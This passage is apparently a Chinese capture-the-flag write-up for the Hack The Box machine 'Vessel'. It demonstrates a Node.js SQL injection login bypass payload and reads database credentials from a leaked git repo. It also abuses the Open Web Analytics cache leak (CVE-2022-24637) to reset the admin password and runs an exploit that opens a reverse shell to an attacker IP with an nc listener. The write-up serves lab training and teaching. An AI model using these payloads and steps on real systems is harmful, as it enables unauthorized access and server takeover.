│&nbsp;&nbsp; │&nbsp;&nbsp; ├── commit-msg.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── post-update.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-applypatch.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-commit.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── prepare-commit-msg.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-push.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-rebase.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-receive.sample
│&nbsp;&nbsp; │&nbsp;&nbsp; └── update.sample
│&nbsp;&nbsp; ├── index
│&nbsp;&nbsp; ├── info
│&nbsp;&nbsp; │&nbsp;&nbsp; └── exclude
│&nbsp;&nbsp; ├── logs
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── HEAD
│&nbsp;&nbsp; │&nbsp;&nbsp; └── refs
│&nbsp;&nbsp; │&nbsp;&nbsp;     └── heads
│&nbsp;&nbsp; │&nbsp;&nbsp;         └── master
│&nbsp;&nbsp; ├── objects
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── 00
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── 459be15fd7f38a86843ba1ce5cd6eabeb50a59
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── 0a
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── ddd8d9ac7f6daf0d44ee78925d07de0a3dee44
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── ......
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── ......
│&nbsp;&nbsp; │&nbsp;&nbsp; └── fc
│&nbsp;&nbsp; │&nbsp;&nbsp;     └── 5ce922a9d1073d6c9cc34770c140cc3488f3fa
│&nbsp;&nbsp; ├── ORIG_HEAD
│&nbsp;&nbsp; └── refs
│&nbsp;&nbsp;     └── heads
│&nbsp;&nbsp;         └── master
├── index.js
├── public
│&nbsp;&nbsp; ├── css
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── style.css
│&nbsp;&nbsp; │&nbsp;&nbsp; └── styles.css
│&nbsp;&nbsp; ├── img
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── bg-masthead.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── error-404-monochrome.svg
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── favicon.ico
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── portfolio
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── thumbnails
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 1.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 2.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 3.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 4.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 5.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     ├── 6.jpg
│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp;     └── images.zip
│&nbsp;&nbsp; │&nbsp;&nbsp; └── profile.jpg
│&nbsp;&nbsp; └── js
│&nbsp;&nbsp;     ├── script.js
│&nbsp;&nbsp;     └── scripts.js
├── routes
│&nbsp;&nbsp; └── index.js
└── views
    ├── 401.ejs
    ├── 404.ejs
    ├── 500.ejs
    ├── index.ejs
    ├── login.ejs
    ├── register.ejs
    └── reset.ejs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>./Vessel/git/config/db.js</code> 看到数据库连接信息</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# cat ./Vessel/git/config/db.js                                                    
var mysql = require('mysql');

var connection = {
        db: {
        host     : 'localhost',
        user     : 'default',
        password : 'daqvACHKvRn84VdVp',
        database : 'vessel'
}};

module.exports = connection;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>./Vessel/git/routes/index.js</code>看到登录页面的数据库查询语句</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat ./Vessel/git/routes/index.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">router.post('/api/login', function(req, res) {
        let username = req.body.username;
        let password = req.body.password;
        if (username &amp;&amp; password) {
                connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
                        if (error) throw error;
                        if (results.length &gt; 0) {
                                req.session.loggedin = true;
                                req.session.username = username;
                                req.flash('success', 'Succesfully logged in!');
                                res.redirect('/admin');
                        } else {
                                req.flash('error', 'Wrong credentials! Try Again!');
                                res.redirect('/login');
                        }
                        res.end();
                });
        } else {
                res.redirect('/login');
        }
});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此处的SQL查询语句参数做了占位符处理，相当于是预编译</p>
<p>直接把这条语句复制到google搜索，找到如下文章，是Nodejs的SQL注入</p>
<h2 id="四、Nodejs-SQL注入"><a href="#四、Nodejs-SQL注入" class="headerlink" title="四、Nodejs-SQL注入"></a>四、Nodejs-SQL注入</h2><p>参考：<a href="https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/">https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324123922105.png" style="zoom:80%;">

<p>意思大概是说，当构造传参payload为<code>username=admin&amp;password[password]=1</code>时，由于Nodejs本身的特性，会将<code>password[password]=1</code>解析成一个对象，而不是解析成字符串，从而sql查询语句会变成如下</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> accounts <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token identifier"><span class="token punctuation">`</span>password<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从而使username为admin，而password逻辑判断恒为1（布尔true），以此达到类似万能密码的效果。</p>
<p>开始操作</p>
<p>点击主页面右上角Login进入登录页面，随便输入用户名密码，同时Burp抓包</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324143405098.png"></p>
<p>修改请求包数据部分为<code>username=admin&amp;password[password]=1</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324144607229.png"></p>
<p>连续点击两次Forward，回到浏览器，可看到以admin身份登录成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230324144443893.png"></p>
<p>查看页面源代码，发现如下子域名</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325102350474.png"></p>
<p>将子域名写入本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.178 openwebanalytics.vessel.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器打开<code>openwebanalytics.vessel.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325102753229.png"></p>
<p>登录框上下都写着<code>Open Web Analytics</code>，那就去google一下<code>Open Web Analytics exploit</code>，看到了这篇文章</p>
<p>From Single/Double Quote Confusion To RCE(CVE-2022-24637)：<a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a></p>
<h2 id="五、CVE-2022-24637"><a href="#五、CVE-2022-24637" class="headerlink" title="五、CVE-2022-24637"></a>五、CVE-2022-24637</h2><p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325161021370.png"></p>
<p>如图，文章开头介绍了这个CVE的两个漏洞点：</p>
<ol>
<li><p>定义PHP缓存文件头的地方，如果用<code>'&lt;?php\n...'</code>，而不是<code>"&lt;?php\n..."</code>，会导致<code>\n</code>不会被解析成换行符，那么<code>&lt;?php\n</code>就不是一个有效的PHP文件头，所在的缓存文件就不会被解析成PHP代码，只会被解析成普通文本，从而导致缓存信息泄露。泄露的信息还可被用于重置管理员密码。</p>
</li>
<li><p>PHP文件写入，但需要管理员权限。通过构造POST请求更改日志路径和日志等级，将日志文件设置为PHP文件。通过同时提高日志级别并使用攻击者控制的数据生成事件，可以将 PHP 代码注入到该日志文件中。这导致可以执行任意PHP代码。</p>
</li>
</ol>
<p>自己本地用<code>php -a</code>测试一下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php &gt; echo '&lt;?php\n/*wa0er*/\n?&gt;';
&lt;?php\n/*wa0er*/\n?&gt;

php &gt; echo "&lt;?php\n/*wa0er*/\n?&gt;";
&lt;?php
/*wa0er*/
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如上结果可以看出单双引号解析的差异</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# cat test1.php
&lt;?php\necho 9898;\n?&gt;

┌──(root💀kali)-[~/Desktop]
└─# php -f test1.php
&lt;?php\necho 9898;\n?&gt;

┌──(root💀kali)-[~/Desktop]
└─# cat test2.php
&lt;?php
echo 9898;
?&gt;

┌──(root💀kali)-[~/Desktop]
└─# php -f test2.php
9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如上结果可以看出两种格式在文件中解析效果</p>
<p>漏洞所在源码：</p>
<p><a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php">https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php</a></p>
<p>关键代码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">...
class owa_fileCache extends owa_cache {
    ...
    var $cache_file_header = '<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*';
    var $cache_file_footer = '*/</span>\n<span class="token delimiter important">?&gt;</span></span>';
    ...
    function putItemToCacheStore($collection, $id) {
            ...   
            $data = $this-&gt;cache_file_header.base64_encode(serialize($this-&gt;cache[$collection][$id])).$this-&gt;cache_file_footer;
            ...     
            $tcf_handle = @fopen($temp_cache_file, 'w');
            ...   
                fputs($tcf_handle, $data); 
                ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此处用的就是单引号，得到的缓存文件中的缓存数据格式如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*先序列化然后base64编码的数据*/</span>\n<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>缓存文件名命名如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$cache_file</span> <span class="token operator">=</span> <span class="token variable">$collection_dir</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@ <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$temp_cache_file</span><span class="token punctuation">,</span> <span class="token variable">$cache_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计发现，默认id值为1，缓存文件拼接后的访问路径为（审计着重关注<code>fileCache.php</code>、<code>cache.php</code>、<code>owa_coreAPI.php</code>、<code>owa_entity.php</code>、<code>user.php</code>）</p>
<pre class="line-numbers language-none"><code class="language-none">http://localhost/owa_web/owa-data/caches/1/owa_user/xxx.php
“http://localhost/owa_web/”表示owa主页面所在路径，此处为http://openwebanalytics.vessel.htb/
php文件名“xxx”表示“id+id值”的32位md5值，比如id=1，那么xxx为“id1”的md5值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325180016845.png" alt="image-20230325180016845"></p>
<p>在<code>openwebanalytics.vessel.htb</code>点击忘记密码，进入重置密码页面，刚才在git日志看到邮箱格式，尝试<code>ethan@vessel.htb</code>不存在，尝试<code>admin@vessel.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325192604236.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325210842981.png"></p>
<p>提示发送邮件到<code>admin@vessel.htb</code></p>
<p>然后根据刚才的分析，id1的md5值如图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325203950107.png"></p>
<p>缓存文件的访问路径如下</p>
<pre class="line-numbers language-none"><code class="language-none">http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问缓存文件，页面空白，查看页面源代码，获取到泄露的base64数据</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230325211124496.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDk1MUhISkY0b0RqWmR6MGJTSWcxYnV1R2ZEYUwxVHpvcGt6d2U2SmRBZnZjU0hoLzd3WHNTIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjNjNmZWQzOGU1OWIyNmU2OGY1YjJjZDc4ZWJkNmJlNSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/</span>\n<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Base64解码得序列化数据</p>
<pre class="line-numbers language-none"><code class="language-none">O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$951HHJF4oDjZdz0bSIg1buuGfDaL1Tzopkzwe6JdAfvcSHh/7wXsS";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"c63fed38e59b26e68f5b2cd78ebd6be5";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>关键点在于<code>temp_passkey</code>的值<code>c63fed38e59b26e68f5b2cd78ebd6be5</code>可用来重置admin的密码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326114429284.png"></p>
<p>那么我们把URL末尾<code>owa_do</code>的值改为<code>base.usersChangePassword</code>，访问</p>
<pre class="line-numbers language-none"><code class="language-none">http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326115057391.png"></p>
<p>直接修改密码，然后点击<code>Save Your New Password</code>，会提示<code>Error! Can't find your temporary passkey in the db.</code></p>
<p>一般思路应该是有个名字类似<code>temp_passkey</code>的参数，可以修改为我们刚才获得的<code>temp_passkey</code>值，以此来绕过修改密码时所需的认证步骤。</p>
<p>然后我们就在<code>F12</code>页面源码看到了如下图内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326115912970.png"></p>
<p>我们把hidden删除，可看到显示除了如下文本框</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326120031489.png"></p>
<p>输入新密码，然后输入刚才<code>temp_passkey</code>的值，点击<code>Save Your New Password</code>，成功修改（这里试了好几次，可能<code>temp_passkey</code>刷新比较快）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326121532735.png"></p>
<p>用admin用户和刚修改的密码登录，登录成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326121903697.png"></p>
<p>已是admin用户，那就尝试用上面文章漏洞利用的第二阶段，进一步执行命令反弹shell，下载下面的exploit脚本到本地</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hupe1980/CVE-2022-24637<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先开启nc监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用如下命令执行脚本</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py -u admin -p wa0er http://openwebanalytics.vessel.htb/ 10.10.16.7 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326145523979.png"></p>
<p>如图成功获取www-data用户shell，但这个shell环境不稳定，换一个交互shell</p>
<p>下载如下脚本到本地</p>
